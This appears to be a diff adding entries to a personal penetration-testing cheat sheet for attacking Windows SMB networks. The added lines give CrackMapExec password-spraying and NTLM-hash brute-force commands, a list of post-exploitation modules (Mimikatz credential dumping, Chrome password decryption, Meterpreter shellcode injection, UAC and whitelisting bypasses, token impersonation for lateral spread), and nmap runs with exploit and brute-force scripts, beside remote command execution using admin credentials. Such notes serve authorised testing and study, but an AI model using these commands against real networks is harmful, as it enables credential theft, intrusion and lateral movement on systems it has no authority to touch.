@@ -78,9 +78,14 @@ Wireshark Filters:
 ntlmssp.ntlmv2_response
 smb.native_lanman
 
+CrackMapExec
 cme smb 192.168.1.0/24
 	-map network hosts
 cme smb 192.168.1.0/24 --gen-relay-list relaylistOutputFilename.txt
+crackmapexec <protocol> <target(s)> -u ~/file_containing_usernames -p ~/file_containing_passwords
+	--smb brute force/password-spraying
+crackmapexec <protocol> <target(s)> -u ~/file_containing_usernames -H ~/file_containing_ntlm_hashes
+	--smb credential spraying/brute force using NTLM hashes
 cat relaylistOutputFilename.txt
 	-generate relay list
 cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --shares
@@ -124,9 +129,27 @@ cme smb 10.10.33.121 -u Administrator -p AAdmin\!23 -X '$PSVersionTable' --exec-
 	-return command execution (flag -x: cmd.exe; -X powershell); --exec-mothods wmiexec, smbexec, atexec; --force-ps32
 cme smb 10.10.33.121 -u Administrator -p 'P@ssw0rd' --wmi-namespace 'root\\cimv2' --wmi "SELECT * FROM Win32_logicalDisk WHERE DeviceID = 'C:'"
 	-wmi command exection
+	Modules Listing:
+[*] empire_exec          Uses Empire's RESTful API to generate a launcher for the specified listener and executes it
+[*] peinject             Downloads the specified DLL/EXE and injects it into memory using PowerSploit's Invoke-ReflectivePEInjection.ps1 script
+[*] rundll32_exec        Executes a command using rundll32 and Windows's native javascript interpreter
+[*] mimikittenz          Executes Mimikittenz
+[*] com_exec             Executes a command using a COM scriptlet to bypass whitelisting
+[*] tokenrider           Allows for automatic token enumeration, impersonation and mass lateral spread using privileges instead of dumped credentials
+[*] tokens               Enumerates available tokens using Powersploit's Invoke-TokenManipulation
+[*] mimikatz             Executes PowerSploit's Invoke-Mimikatz.ps1 script
+[*] powerview            Wrapper for PowerView's functions
+[*] shellinject          Downloads the specified raw shellcode and injects it into memory using PowerSploit's Invoke-Shellcode.ps1 script
+[*] enum_chrome          Uses Powersploit's Invoke-Mimikatz.ps1 script to decrypt saved Chrome passwords
+[*] metinject            Downloads the Meterpreter stager and injects it into memory using PowerSploit's Invoke-Shellcode.ps1 script
+[*] eventvwr_bypass      Executes a command using the eventvwr.exe fileless UAC bypass
 
+
+NMAP
 nmap -p 445 --script smb-os-discovery 192.168.1.0/24
 nmap -sV -p 445 --script smb-brute 192.168.1.101
+nmap -p 135,445 -T4 -A --script version,vuln,safe,default,exploit --script-args smbuser=uname,smbpass=pword target.dom
+
 
 smbd -b | grep WITH_PAM
 	-check if samba was configured with PAM(pluggable authentication modules)
